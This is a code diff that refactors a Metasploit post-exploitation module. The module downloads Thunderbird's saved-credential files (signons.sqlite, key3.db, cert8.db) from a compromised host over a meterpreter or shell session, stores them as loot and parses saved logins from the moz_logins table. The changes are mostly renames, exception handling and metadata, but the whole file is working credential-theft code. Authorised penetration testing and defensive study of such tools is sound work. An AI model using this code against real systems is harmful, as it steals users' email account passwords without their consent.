@@ -38,6 +38,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_config_getenv
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -89,20 +94,22 @@ class MetasploitModule < Msf::Post
   # The routine will attempt to parse the sqlite db if the PARSE option is true,
   # and that SQLite3 is installed on the user's box.
   #
-  def download_loot(p)
+  def download_loot(path)
     # These are the files we wanna grab for the directory for future decryption
     files = ['signons.sqlite', 'key3.db', 'cert8.db']
 
     files.each do |item|
       loot = ''
 
-      # Downaload the file
+      # Download the file
+      # # @todo replace this with `Msf::Post::File.read_file`
       if session.type == 'meterpreter'
-        vprint_status("Downloading: #{p + item}")
+        vprint_status("Downloading: #{path + item}")
         begin
-          f = session.fs.file.new(p + item, 'rb')
+          f = session.fs.file.new(path + item, 'rb')
           loot << f.read until f.eof?
-        rescue ::Exception => e
+        rescue StandardError => e
+          vprint_error(e.message)
         ensure
           f.close
         end
@@ -110,7 +117,7 @@ class MetasploitModule < Msf::Post
         cmd_show = (session.platform == 'windows') ? 'type' : 'cat'
         # The type command will add a 0x0a character in the file?  Pff.
         # Gotta lstrip that.
-        loot = cmd_exec(cmd_show, "\"#{p + item}\"").lstrip
+        loot = cmd_exec(cmd_show, "\"#{path + item}\"").lstrip
         next if loot =~ /system cannot find the file specified|No such file/
       end
 
@@ -118,7 +125,7 @@ class MetasploitModule < Msf::Post
       ext = ::File.extname(item)
       ext = ext[1, ext.length]
 
-      path = store_loot(
+      loot_path = store_loot(
         "tb.#{item}",
         "binary/#{ext}",
         session,
@@ -127,26 +134,27 @@ class MetasploitModule < Msf::Post
         "Thunderbird Raw File #{item}"
       )
 
-      print_status("#{item} saved in #{path}")
+      print_status("#{item} saved in #{loot_path}")
 
       # Parse signons.sqlite
       next unless item =~ (/signons\.sqlite/) && datastore['PARSE']
 
       print_status('Parsing signons.sqlite...')
-      data_tbl = parse(path)
+      data_tbl = parse(loot_path)
       if data_tbl.nil? || data_tbl.rows.empty?
         print_status('No data parsed')
-      else
-        path = store_loot(
-          "tb.parsed.#{item}",
-          'text/plain',
-          session,
-          data_tbl.to_csv,
-          "thunderbird_parsed_#{item}",
-          "Thunderbird Parsed File #{item}"
-        )
-        print_status("Parsed signons.sqlite saved in: #{path}")
+        next
       end
+
+      loot_path = store_loot(
+        "tb.parsed.#{item}",
+        'text/plain',
+        session,
+        data_tbl.to_csv,
+        "thunderbird_parsed_#{item}",
+        "Thunderbird Parsed File #{item}"
+      )
+      print_status("Parsed signons.sqlite saved in: #{loot_path}")
     end
   end
 
@@ -167,8 +175,8 @@ class MetasploitModule < Msf::Post
     # Load the database
     db = SQLite3::Database.new(file)
     begin
-      columns, *rows = db.execute('select * from moz_logins')
-    rescue ::Exception => e
+      _, *rows = db.execute('select * from moz_logins')
+    rescue StandardError => e
       print_error("doh! #{e}")
       return nil
     ensure
